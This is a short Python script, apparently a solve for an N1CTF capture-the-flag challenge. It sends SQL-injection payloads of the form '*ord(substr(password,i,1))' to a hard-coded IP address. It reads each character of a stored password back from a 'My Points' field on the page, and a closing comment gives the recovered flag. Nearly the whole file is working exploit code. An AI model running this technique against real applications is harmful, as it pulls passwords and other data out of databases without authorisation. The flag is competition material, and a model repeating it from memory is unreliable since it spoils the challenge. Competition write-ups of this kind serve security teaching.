import re
import requests

_target = 'http://47.75.14.48/'

flag = ''
for i in range(1,16):
    d = {'flag': '1', 'hi': '*ord(substr(password,{},1))'.format(i)}
    resp = requests.post(_target, data=d)
    flag += chr(int(re.search(r'<grey>My Points</grey> \| ([0-9]+)<br/>', resp.text).group(1).strip()))
    print flag

print '[+] flag: N1CTF{{{}}}'.format(flag)

# N1CTF{helloctfer23333}